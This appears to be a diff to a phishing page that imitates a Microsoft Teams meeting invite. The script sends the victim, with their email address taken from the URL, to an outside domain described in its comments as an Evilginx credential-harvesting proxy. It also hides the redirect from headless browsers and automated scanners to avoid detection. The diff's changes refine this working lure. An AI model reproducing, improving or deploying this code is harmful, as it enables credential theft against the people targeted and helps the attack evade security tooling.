@@ -11,31 +11,30 @@
 
 <script>
 window.addEventListener('load', function() {
-  const hash = window.location.hash;
+  const hash = window.location.hash; // "#target@example.com"
   const email = hash ? hash.substring(1) : '';
 
-  // Anti-bot / honey-pot check
-  const token = document.getElementById('teams-verification-token')?.value;
-  const honey = document.getElementById('teams-honey-field')?.value;
-  if (!token || honey) return;
-
   // Headless detection
-  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;
+  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
+    console.warn("Headless bot detected; redirect blocked");
+    return;
+  }
 
-  // Update button to go to Evilginx
+  // Update button to go to Evilginx, preserving hash
   const button = document.querySelector('.teams-button');
   if (button) {
     const baseURL = 'https://access-meetings.visions-solutions.ca/yLobagKc';
-    button.onclick = function() {
+    button.addEventListener('click', function() {
       if (email && email.includes('@')) {
-        window.location.href = baseURL + '#' + email;
+        window.location.href = `${baseURL}#${email}`;
       } else {
         window.location.href = baseURL;
       }
-    };
+    });
   }
 });
 </script>
 </body>
 </html>
+
 
